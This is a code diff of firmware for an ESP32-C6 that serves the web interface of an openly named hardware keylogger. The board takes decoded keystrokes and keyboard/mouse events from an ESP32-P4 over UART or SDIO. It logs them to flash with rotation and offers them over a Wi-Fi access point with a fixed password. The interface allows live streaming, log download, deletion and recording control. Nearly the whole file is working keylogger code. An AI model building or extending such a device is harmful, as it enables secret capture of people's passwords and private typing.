@@ -1,25 +1,34 @@
-// ESP32-C6 firmware for the keylogger web UI.
+// ESP32-C6 firmware for the keylogger web UI (v1).
 //
-// - Hosts Wi-Fi soft AP "P4-KeyLogger" / "changeme123"
-// - Serves the web UI at http://192.168.4.1
-// - WebSocket at /ws streams incoming keystrokes to browsers
-// - UART1 on GPIO4 (RX) reads a plain-text stream of decoded keystrokes
-//   coming from the ESP32-P4 (P4 sends via UART TX on GPIO37).
-//   NO wiring assumption: if the P4 doesn't send anything, the web UI simply
-//   shows nothing new — the C6 firmware never crashes.
-//
-// This is intentionally standalone. The C6 has its own Wi-Fi and doesn't
-// need esp-hosted-mcu.  P4 firmware is untouched by default.
+// - Wi-Fi soft AP "P4-KeyLogger" / "changeme123"
+// - Web UI at http://192.168.4.1
+//   * live WebSocket stream (keys + kbd/mouse status)
+//   * download / delete log, start/stop recording, auto-download toggle
+// - SPIFFS at /data — log.txt (current) rotates to log.old.txt at 1.5 MB
+// - UART1 RX on GPIO4 reads a line-based framed stream from the P4:
+//     KEY <text>\n
+//     EVT KBD_CONNECT | KBD_DISCONNECT | MOUSE_CONNECT | MOUSE_DISCONNECT\n
+//     RAW <hex bytes>\n
+// - Settings persisted in NVS (recording on/off, auto-download on/off)
 
 #include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
 #include "esp_log.h"
 #include "esp_event.h"
 #include "esp_netif.h"
 #include "esp_wifi.h"
 #include "esp_http_server.h"
+#include "esp_spiffs.h"
+#include "esp_heap_caps.h"
+#include "nvs.h"
 #include "nvs_flash.h"
 #include "driver/uart.h"
 #include "driver/gpio.h"
+#include "driver/sdio_slave.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "freertos/semphr.h"
@@ -27,27 +36,76 @@
 
 static const char *TAG = "c6ui";
 
-// ------------------------------- config -------------------------------
-#define AP_SSID     "P4-KeyLogger"
-#define AP_PASS     "changeme123"
-#define AP_CHANNEL  6
-#define AP_MAX_STA  4
+// ----------------------------- config ---------------------------------
+#define AP_SSID       "P4-KeyLogger"
+#define AP_PASS       "changeme123"
+#define AP_CHANNEL    6
+#define AP_MAX_STA    4
 
-#define P4_UART_NUM UART_NUM_1
-#define P4_UART_RX  GPIO_NUM_4
-#define P4_UART_BAUD 115200
+#define P4_UART_NUM   UART_NUM_1
+#define P4_UART_RX    GPIO_NUM_4
+#define P4_UART_BAUD  115200
 
-#define MAX_WS_CLIENTS 4
-#define KEYS_RING_BYTES 16384
+#define MAX_WS_CLIENTS   4
+#define LIVE_RING_BYTES  16384
 
-// ------------------------------- state --------------------------------
+#define LOG_MOUNT        "/data"
+#define LOG_CURRENT_PATH "/data/log.txt"
+#define LOG_OLD_PATH     "/data/log.old.txt"
+#define LOG_MAX_BYTES    (1500 * 1024)     // rotate at 1.5 MB
+#define LOG_WARN_BYTES   (1350 * 1024)     // trigger auto-download at 90%
+
+#define NVS_NS           "kl"
+#define NVS_K_REC        "rec"
+#define NVS_K_AUTODL     "adl"
+
+// --------------------------- state ------------------------------------
 extern const char WEB_UI_HTML[];
 extern const int  WEB_UI_HTML_LEN;
 
 static httpd_handle_t s_http;
 static int s_ws_fds[MAX_WS_CLIENTS];
 static SemaphoreHandle_t s_ws_lock;
-static RingbufHandle_t   s_keys_ring;    // recent keys, for late clients
+static RingbufHandle_t   s_live_ring;
+
+static SemaphoreHandle_t s_log_lock;
+static bool s_recording   = true;
+static bool s_auto_dl     = false;
+static bool s_kbd_present = false;
+static bool s_mouse_present = false;
+static bool s_warned_pending_dl = false;
+static uint32_t s_sta_count = 0;
+static uint32_t s_uart_bytes_total = 0;   // diagnostic: total bytes seen on GPIO4
+static uint32_t s_sdio_bytes_total = 0;   // diagnostic: total bytes seen over SDIO
+
+#define SDIO_RX_BUFSZ 512
+#define SDIO_RX_NBUF  8
+
+// --------------------------- helpers ----------------------------------
+static void nvs_load_settings(void) {
+    nvs_handle_t h;
+    if (nvs_open(NVS_NS, NVS_READONLY, &h) != ESP_OK) return;
+    uint8_t v = 0;
+    if (nvs_get_u8(h, NVS_K_REC,    &v) == ESP_OK) s_recording = v ? true : false;
+    if (nvs_get_u8(h, NVS_K_AUTODL, &v) == ESP_OK) s_auto_dl   = v ? true : false;
+    nvs_close(h);
+}
+static void nvs_save_settings(void) {
+    nvs_handle_t h;
+    if (nvs_open(NVS_NS, NVS_READWRITE, &h) != ESP_OK) return;
+    nvs_set_u8(h, NVS_K_REC,    s_recording ? 1 : 0);
+    nvs_set_u8(h, NVS_K_AUTODL, s_auto_dl   ? 1 : 0);
+    nvs_commit(h);
+    nvs_close(h);
+}
+
+static size_t file_size(const char *path) {
+    struct stat st;
+    return stat(path, &st) == 0 ? (size_t)st.st_size : 0;
+}
+static size_t log_total_bytes(void) {
+    return file_size(LOG_CURRENT_PATH) + file_size(LOG_OLD_PATH);
+}
 
 // ------------------------- WebSocket bookkeeping ---------------------
 static void ws_add(int fd) {
@@ -75,8 +133,55 @@ static void ws_broadcast(const char *data, size_t len) {
         if (httpd_ws_send_frame_async(s_http, fds[i], &f) != ESP_OK) ws_drop(fds[i]);
     }
 }
+static void ws_broadcast_str(const char *s) { ws_broadcast(s, strlen(s)); }
 
-// ------------------------- HTTP handlers -----------------------------
+// --------------------- log write + rotate -----------------------------
+static void log_write(const char *line, size_t n) {
+    if (!s_recording) return;
+    xSemaphoreTake(s_log_lock, portMAX_DELAY);
+
+    size_t cur = file_size(LOG_CURRENT_PATH);
+    if (cur + n > LOG_MAX_BYTES) {
+        // Rotate: delete old, rename current -> old.
+        // Delete old BEFORE writing new so we can never exceed 2 * LOG_MAX_BYTES.
+        unlink(LOG_OLD_PATH);
+        rename(LOG_CURRENT_PATH, LOG_OLD_PATH);
+        cur = 0;
+        s_warned_pending_dl = false;
+    }
+    FILE *f = fopen(LOG_CURRENT_PATH, "ab");
+    if (f) { fwrite(line, 1, n, f); fclose(f); }
+
+    // Warn at 90% so auto-download client has time to fetch before rotate.
+    size_t total = file_size(LOG_CURRENT_PATH) + file_size(LOG_OLD_PATH);
+    bool warn = total > LOG_WARN_BYTES && !s_warned_pending_dl;
+    xSemaphoreGive(s_log_lock);
+
+    if (warn) {
+        s_warned_pending_dl = true;
+        // Send an out-of-band control message the JS client watches for.
+        ws_broadcast_str("\x1eCTL autodownload\n");
+    }
+}
+static void log_delete_all(void) {
+    xSemaphoreTake(s_log_lock, portMAX_DELAY);
+    unlink(LOG_CURRENT_PATH);
+    unlink(LOG_OLD_PATH);
+    s_warned_pending_dl = false;
+    xSemaphoreGive(s_log_lock);
+}
+
+// --------------------- publish (broadcast + store) --------------------
+// All C6-generated frames go through here so tabs and disk see the same data.
+static void publish(const char *line) {
+    size_t n = strlen(line);
+    if (!n) return;
+    xRingbufferSend(s_live_ring, line, n, 0);
+    ws_broadcast(line, n);
+    log_write(line, n);
+}
+
+// ------------------------- HTTP handlers ------------------------------
 static esp_err_t h_root(httpd_req_t *r) {
     httpd_resp_set_type(r, "text/html; charset=utf-8");
     httpd_resp_set_hdr(r, "Cache-Control", "no-store");
@@ -87,47 +192,119 @@ static esp_err_t h_ws(httpd_req_t *r) {
     if (r->method == HTTP_GET) {
         int fd = httpd_req_to_sockfd(r);
         ws_add(fd);
-        ESP_LOGI(TAG, "ws client fd=%d", fd);
-        // Backfill: send whatever recent bytes are in the ring
+        // Send a hello frame that primes the UI status pills.
+        char hello[128];
+        int n = snprintf(hello, sizeof(hello),
+            "\x1eSTATUS kbd=%d mouse=%d rec=%d adl=%d\n",
+            s_kbd_present, s_mouse_present, s_recording, s_auto_dl);
+        httpd_ws_frame_t hf = { .final=true, .type=HTTPD_WS_TYPE_TEXT,
+                                .payload=(uint8_t*)hello, .len=n };
+        httpd_ws_send_frame_async(r->handle, fd, &hf);
+
+        // Backfill: last KB of live ring (recent keys).
         size_t item_sz = 0;
-        char *item = (char *)xRingbufferReceiveUpTo(s_keys_ring, &item_sz, 0, 2048);
+        char *item = (char *)xRingbufferReceiveUpTo(s_live_ring, &item_sz, 0, 2048);
         if (item && item_sz) {
             httpd_ws_frame_t f = { .final=true, .type=HTTPD_WS_TYPE_TEXT,
                                    .payload=(uint8_t*)item, .len=item_sz };
             httpd_ws_send_frame_async(r->handle, fd, &f);
         }
-        if (item) vRingbufferReturnItem(s_keys_ring, item);
+        if (item) vRingbufferReturnItem(s_live_ring, item);
         return ESP_OK;
     }
-    // Ignore inbound frames but drain them so the socket stays alive
     httpd_ws_frame_t f = { 0 };
-    uint8_t buf[128];
-    f.payload = buf;
+    uint8_t buf[128]; f.payload = buf;
     if (httpd_ws_recv_frame(r, &f, sizeof(buf)) != ESP_OK) ws_drop(httpd_req_to_sockfd(r));
     return ESP_OK;
 }
 
 static esp_err_t h_status(httpd_req_t *r) {
-    char body[96];
+    char body[256];
+    size_t used = log_total_bytes();
     int n = snprintf(body, sizeof(body),
-                     "{\"chip\":\"esp32c6\",\"ssid\":\"%s\",\"connected_ws\":%d}",
-                     AP_SSID, MAX_WS_CLIENTS);
+        "{\"chip\":\"esp32c6\",\"ssid\":\"%s\",\"kbd\":%s,\"mouse\":%s,"
+         "\"recording\":%s,\"autoDownload\":%s,\"logBytes\":%u,\"logMax\":%u,"
+         "\"warnBytes\":%u,\"clients\":%u,\"uartRxBytes\":%u,\"sdioRxBytes\":%u}",
+        AP_SSID, s_kbd_present?"true":"false", s_mouse_present?"true":"false",
+        s_recording?"true":"false", s_auto_dl?"true":"false",
+        (unsigned)used, (unsigned)LOG_MAX_BYTES, (unsigned)LOG_WARN_BYTES,
+        (unsigned)s_sta_count, (unsigned)s_uart_bytes_total,
+        (unsigned)s_sdio_bytes_total);
     httpd_resp_set_type(r, "application/json");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+    return httpd_resp_send(r, body, n);
+}
+
+static esp_err_t h_download(httpd_req_t *r) {
+    httpd_resp_set_type(r, "text/plain; charset=utf-8");
+    httpd_resp_set_hdr(r, "Content-Disposition", "attachment; filename=\"keylog.txt\"");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+
+    xSemaphoreTake(s_log_lock, portMAX_DELAY);
+    // Emit old first, then current, so the file reads oldest→newest.
+    const char *paths[2] = { LOG_OLD_PATH, LOG_CURRENT_PATH };
+    char buf[1024];
+    for (int i = 0; i < 2; i++) {
+        FILE *f = fopen(paths[i], "rb");
+        if (!f) continue;
+        size_t n;
+        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
+            if (httpd_resp_send_chunk(r, buf, n) != ESP_OK) { fclose(f); goto done; }
+        }
+        fclose(f);
+    }
+done:
+    xSemaphoreGive(s_log_lock);
+    httpd_resp_send_chunk(r, NULL, 0);
+    return ESP_OK;
+}
+
+static esp_err_t h_log_delete(httpd_req_t *r) {
+    log_delete_all();
+    publish("EVT LOG_CLEARED\n");
+    httpd_resp_set_type(r, "application/json");
+    return httpd_resp_sendstr(r, "{\"ok\":true}");
+}
+
+static esp_err_t h_rec_start(httpd_req_t *r) {
+    s_recording = true; nvs_save_settings();
+    publish("EVT REC_START\n");
+    httpd_resp_set_type(r, "application/json");
+    return httpd_resp_sendstr(r, "{\"recording\":true}");
+}
+static esp_err_t h_rec_stop(httpd_req_t *r) {
+    s_recording = false; nvs_save_settings();
+    // Publish AFTER the flag flip so we still see it on the live wire, but it
+    // won't be persisted since s_recording is false now.
+    ws_broadcast_str("EVT REC_STOP\n");
+    httpd_resp_set_type(r, "application/json");
+    return httpd_resp_sendstr(r, "{\"recording\":false}");
+}
+static esp_err_t h_autodl_set(httpd_req_t *r) {
+    char q[32] = { 0 };
+    httpd_req_get_url_query_str(r, q, sizeof(q));
+    char v[8] = { 0 };
+    httpd_query_key_value(q, "v", v, sizeof(v));
+    s_auto_dl = (v[0] == '1');
+    nvs_save_settings();
+    httpd_resp_set_type(r, "application/json");
+    char body[48];
+    int n = snprintf(body, sizeof(body), "{\"autoDownload\":%s}", s_auto_dl?"true":"false");
     return httpd_resp_send(r, body, n);
 }
 
 // ------------------------- Wi-Fi AP + HTTP ----------------------------
 static void wifi_event(void *arg, esp_event_base_t base, int32_t id, void *data) {
     (void)arg; (void)data;
-    if (base == WIFI_EVENT && id == WIFI_EVENT_AP_STACONNECTED)    ESP_LOGI(TAG, "STA connected");
-    else if (base == WIFI_EVENT && id == WIFI_EVENT_AP_STADISCONNECTED) ESP_LOGI(TAG, "STA disconnected");
+    if (base != WIFI_EVENT) return;
+    if (id == WIFI_EVENT_AP_STACONNECTED)         { s_sta_count++; ESP_LOGI(TAG, "STA+"); }
+    else if (id == WIFI_EVENT_AP_STADISCONNECTED) { if (s_sta_count) s_sta_count--; ESP_LOGI(TAG, "STA-"); }
 }
 
 static esp_err_t wifi_ap_up(void) {
     esp_err_t err = nvs_flash_init();
     if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
-        nvs_flash_erase();
-        err = nvs_flash_init();
+        nvs_flash_erase(); err = nvs_flash_init();
     }
     if (err != ESP_OK) return err;
 
@@ -156,14 +333,20 @@ static esp_err_t wifi_ap_up(void) {
 
 static esp_err_t http_up(void) {
     httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
-    cfg.max_uri_handlers = 8;
+    cfg.max_uri_handlers = 16;
     cfg.recv_wait_timeout = 5;
-    cfg.send_wait_timeout = 5;
+    cfg.send_wait_timeout = 10;
+    cfg.stack_size = 8192;
     if (httpd_start(&s_http, &cfg) != ESP_OK) return ESP_FAIL;
     httpd_uri_t routes[] = {
-        {"/",        HTTP_GET, h_root,   NULL, false, false, NULL},
-        {"/ws",      HTTP_GET, h_ws,     NULL, true,  false, NULL},
-        {"/status",  HTTP_GET, h_status, NULL, false, false, NULL},
+        {"/",              HTTP_GET,  h_root,       NULL, false, false, NULL},
+        {"/ws",            HTTP_GET,  h_ws,         NULL, true,  false, NULL},
+        {"/status",        HTTP_GET,  h_status,     NULL, false, false, NULL},
+        {"/log/download",  HTTP_GET,  h_download,   NULL, false, false, NULL},
+        {"/log/delete",    HTTP_POST, h_log_delete, NULL, false, false, NULL},
+        {"/rec/start",     HTTP_POST, h_rec_start,  NULL, false, false, NULL},
+        {"/rec/stop",      HTTP_POST, h_rec_stop,   NULL, false, false, NULL},
+        {"/autodl",        HTTP_POST, h_autodl_set, NULL, false, false, NULL},
     };
     for (unsigned i = 0; i < sizeof(routes)/sizeof(routes[0]); i++)
         httpd_register_uri_handler(s_http, &routes[i]);
@@ -171,50 +354,147 @@ static esp_err_t http_up(void) {
     return ESP_OK;
 }
 
+// ------------------------- storage ------------------------------------
+static esp_err_t storage_up(void) {
+    esp_vfs_spiffs_conf_t cfg = {
+        .base_path = LOG_MOUNT,
+        .partition_label = "storage",
+        .max_files = 4,
+        .format_if_mount_failed = true,
+    };
+    esp_err_t err = esp_vfs_spiffs_register(&cfg);
+    if (err != ESP_OK) { ESP_LOGE(TAG, "spiffs: %s", esp_err_to_name(err)); return err; }
+    size_t total = 0, used = 0;
+    esp_spiffs_info("storage", &total, &used);
+    ESP_LOGI(TAG, "SPIFFS %u/%u bytes used", (unsigned)used, (unsigned)total);
+    return ESP_OK;
+}
+
+// ------------------------- SDIO slave (P4 → C6) -----------------------
+// Set up SDIO slave on the fixed C6 pins (CLK=19 CMD=18 D0..D3=20..23).
+// The P4 pushes newline-terminated text packets; we split on '\n' and
+// funnel them through publish() so they show up in the web UI and log.
+
+static void sdio_rx_task(void *arg) {
+    (void)arg;
+    char line[512]; int li = 0;
+    while (1) {
+        uint8_t *rx = NULL; size_t rx_len = 0;
+        sdio_slave_buf_handle_t h = NULL;
+        esp_err_t err = sdio_slave_recv(&h, &rx, &rx_len, portMAX_DELAY);
+        if (err != ESP_OK) { vTaskDelay(pdMS_TO_TICKS(10)); continue; }
+        if (rx && rx_len) {
+            s_sdio_bytes_total += rx_len;
+            for (size_t i = 0; i < rx_len; i++) {
+                uint8_t c = rx[i];
+                if (c == 0) continue;   // padding
+                if (c == '\r') continue;
+                if (c == '\n') {
+                    if (li == 0) continue;
+                    line[li++] = '\n'; line[li] = 0;
+                    if      (!strncmp(line, "EVT KBD_CONNECT",    15)) s_kbd_present   = true;
+                    else if (!strncmp(line, "EVT KBD_DISCONNECT", 18)) s_kbd_present   = false;
+                    else if (!strncmp(line, "EVT MOUSE_CONNECT",  17)) s_mouse_present = true;
+                    else if (!strncmp(line, "EVT MOUSE_DISCONNECT",20)) s_mouse_present = false;
+                    publish(line);
+                    li = 0;
+                } else if (li < (int)sizeof(line) - 2) {
+                    line[li++] = (char)c;
+                } else {
+                    line[li] = 0; publish(line); li = 0;
+                }
+            }
+        }
+        if (h) sdio_slave_recv_load_buf(h);
+    }
+}
+
+static esp_err_t sdio_slave_up(void) {
+    sdio_slave_config_t cfg = {
+        .sending_mode      = SDIO_SLAVE_SEND_STREAM,
+        .send_queue_size   = 4,
+        .recv_buffer_size  = SDIO_RX_BUFSZ,
+    };
+    esp_err_t err = sdio_slave_initialize(&cfg);
+    if (err != ESP_OK) { ESP_LOGE(TAG, "sdio_slave_init: %s", esp_err_to_name(err)); return err; }
+    for (int i = 0; i < SDIO_RX_NBUF; i++) {
+        uint8_t *b = heap_caps_malloc(SDIO_RX_BUFSZ, MALLOC_CAP_DMA);
+        if (!b) { ESP_LOGE(TAG, "sdio dma buf alloc failed"); return ESP_ERR_NO_MEM; }
+        sdio_slave_buf_handle_t h = sdio_slave_recv_register_buf(b);
+        if (!h) { ESP_LOGE(TAG, "sdio buf register failed"); return ESP_FAIL; }
+        sdio_slave_recv_load_buf(h);
+    }
+    err = sdio_slave_start();
+    if (err != ESP_OK) { ESP_LOGE(TAG, "sdio_slave_start: %s", esp_err_to_name(err)); return err; }
+    xTaskCreate(sdio_rx_task, "sdio_rx", 4096, NULL, 5, NULL);
+    ESP_LOGI(TAG, "SDIO slave up on default pins (CLK=19 CMD=18 D0..D3=20..23)");
+    return ESP_OK;
+}
+
 // ------------------------- UART reader (P4 → C6) ----------------------
-// The P4 firmware can optionally push a text stream of keystrokes to us.
-// If it never sends anything, we don't care — the web UI still works.
+// Reads line-based frames; each line is a single logical record.
+// This lets us treat KEY / EVT / RAW uniformly and update UI state on EVT
+// without corrupting keystroke bytes if they contain the substring "EVT".
 static void uart_task(void *arg) {
     (void)arg;
     uart_config_t cfg = {
-        .baud_rate = P4_UART_BAUD,
-        .data_bits = UART_DATA_8_BITS,
-        .parity    = UART_PARITY_DISABLE,
-        .stop_bits = UART_STOP_BITS_1,
-        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
-        .source_clk = UART_SCLK_DEFAULT,
+        .baud_rate = P4_UART_BAUD, .data_bits = UART_DATA_8_BITS,
+        .parity = UART_PARITY_DISABLE, .stop_bits = UART_STOP_BITS_1,
+        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE, .source_clk = UART_SCLK_DEFAULT,
     };
-    uart_driver_install(P4_UART_NUM, 2048, 0, 0, NULL, 0);
+    uart_driver_install(P4_UART_NUM, 4096, 0, 0, NULL, 0);
     uart_param_config(P4_UART_NUM, &cfg);
     uart_set_pin(P4_UART_NUM, UART_PIN_NO_CHANGE, P4_UART_RX,
                  UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
 
-    char buf[256];
+    char line[512]; int li = 0;
+    uint8_t buf[256];
     while (1) {
         int n = uart_read_bytes(P4_UART_NUM, buf, sizeof(buf), pdMS_TO_TICKS(50));
-        if (n > 0) {
-            // Push to ring buffer for late-connecting clients + broadcast
-            xRingbufferSend(s_keys_ring, buf, n, 0);
-            ws_broadcast(buf, n);
+        if (n > 0) s_uart_bytes_total += n;
+        for (int i = 0; i < n; i++) {
+            uint8_t c = buf[i];
+            if (c == '\n') {
+                if (li == 0) continue;
+                line[li++] = '\n'; line[li] = 0;
+                // Recognize EVT keyboard/mouse presence to keep local UI state.
+                if (!strncmp(line, "EVT KBD_CONNECT",    15)) s_kbd_present   = true;
+                else if (!strncmp(line, "EVT KBD_DISCONNECT",    18)) s_kbd_present   = false;
+                else if (!strncmp(line, "EVT MOUSE_CONNECT",    17)) s_mouse_present = true;
+                else if (!strncmp(line, "EVT MOUSE_DISCONNECT",  20)) s_mouse_present = false;
+                publish(line);
+                li = 0;
+            } else if (c == '\r') {
+                // ignore
+            } else if (li < (int)sizeof(line) - 2) {
+                line[li++] = (char)c;
+            } else {
+                // overflow — emit what we have as a raw chunk and reset
+                line[li] = 0; publish(line); li = 0;
+            }
         }
     }
 }
 
 // ------------------------- app entry ---------------------------------
 void app_main(void) {
-    ESP_LOGI(TAG, "ESP32-C6 KeyLogger web UI starting");
-    s_ws_lock = xSemaphoreCreateMutex();
-    s_keys_ring = xRingbufferCreate(KEYS_RING_BYTES, RINGBUF_TYPE_BYTEBUF);
+    ESP_LOGI(TAG, "ESP32-C6 KeyLogger v1 starting");
+    s_ws_lock  = xSemaphoreCreateMutex();
+    s_log_lock = xSemaphoreCreateMutex();
+    s_live_ring = xRingbufferCreate(LIVE_RING_BYTES, RINGBUF_TYPE_BYTEBUF);
 
-    // Bring up Wi-Fi first; if it fails we log and keep going (still useful
-    // to have HTTP up on a static AP once someone reboots).
+    // Bring SDIO slave up BEFORE Wi-Fi so the host CMD5/CMD3 enumeration
+    // isn't racing against Wi-Fi driver init on the C6's single core.
+    if (sdio_slave_up() != ESP_OK) ESP_LOGE(TAG, "SDIO slave failed (P4 link disabled)");
+
     if (wifi_ap_up() != ESP_OK) ESP_LOGE(TAG, "Wi-Fi AP failed");
-    if (http_up() != ESP_OK)   ESP_LOGE(TAG, "HTTP server failed");
+    if (storage_up() != ESP_OK) ESP_LOGE(TAG, "SPIFFS failed (log persistence disabled)");
+    nvs_load_settings();
+    if (http_up()   != ESP_OK) ESP_LOGE(TAG, "HTTP server failed");
 
     xTaskCreate(uart_task, "uart_rx", 4096, NULL, 5, NULL);
 
-    ESP_LOGI(TAG, "Connect to \"%s\" with password \"%s\", browse to http://192.168.4.1",
-             AP_SSID, AP_PASS);
-    // Idle forever; workers run on their own tasks.
+    ESP_LOGI(TAG, "SSID \"%s\" PASS \"%s\" -> http://192.168.4.1  rec=%d adl=%d",
+             AP_SSID, AP_PASS, s_recording, s_auto_dl);
     while (1) vTaskDelay(pdMS_TO_TICKS(5000));
 }
